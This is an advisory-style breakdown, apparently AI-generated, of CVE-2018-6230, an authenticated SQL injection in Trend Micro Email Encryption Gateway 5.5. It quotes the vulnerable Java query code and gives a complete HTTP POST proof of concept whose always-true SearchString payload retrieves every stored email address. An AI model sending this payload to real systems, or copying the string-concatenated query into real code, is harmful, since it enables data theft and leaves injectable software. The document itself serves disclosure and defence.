Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2018-6230:

**CVE-2018-6230:**

*   **Root Cause:** The `SearchString` parameter in the `emailSearch.jsp` script is not sanitized before being used in a SQL query.
*   **Vulnerability:** SQL Injection
*   **Impact:** An attacker can execute arbitrary SQL queries. The provided proof of concept shows that an attacker could retrieve all email addresses from the database. This can lead to data breaches, information disclosure, and potentially further compromise of the system if more sensitive information is exposed through SQL injection.
*   **Attack Vector:**  A remote attacker can send a crafted HTTP POST request to the vulnerable `emailSearch.jsp` endpoint with a malicious `SearchString` parameter.
*   **Required Attacker Capabilities/Position:**  The attacker needs to be able to send HTTP requests to the vulnerable application. The attacker also needs to be authenticated to access the vulnerable endpoint.

**Technical Details:**

The `emailSearch.jsp` script reads the `SearchString` parameter from the request and passes it to the `setSearchParam` method of the `wsEmailSearch` class. This parameter is then used in the `getResults` method to build a SQL query. No sanitization is performed on the `_searchParam` property, so the provided user input is directly concatenated into the SQL query, leading to SQL injection:

```java
public class wsEmailSearch
{
    private String _searchParam = "";
    public void setSearchParam(String searchParam) { _searchParam = searchParam; }

    public Vector getResults()
    {
        Vector res = new Vector();

        Connection cnn = MySQLClient.GetInstance().GetConnection();
        try
        {
            Statement query = cnn.createStatement();

            ResultSet rs = query.executeQuery("SELECT address FROM
RulesEmailAddresses WHERE address LIKE '%" + _searchParam + "%' ORDER BY
address");
[...]
```
**Proof of Concept:**

The following HTTP POST request demonstrates how to exploit this vulnerability, retrieving all email addresses from the database by crafting the search query to be always true.

```
POST /emailSearch.jsp HTTP/1.1
Host: server
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0)
Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Referer: https://server/policies.jsp
Content-Length: 39
Cookie: JSESSIONID=4CFE9B6E37DFABC16AF5D6F091F1A0E2
Connection: close

SearchString=' OR '%1%'='%1
```

**Additional Notes:**

*   This SQL injection is part of a larger set of vulnerabilities found in Trend Micro Email Encryption Gateway 5.5, as detailed in the provided exploit-db entry (EDB-ID 44166) and Core Security advisory (CORE-2017-0006).

*   The attacker has to have a valid session to access the endpoint and exploit this vulnerability, meaning that it can be chained with other vulnerabilities that compromise user credentials or provide authentication bypass.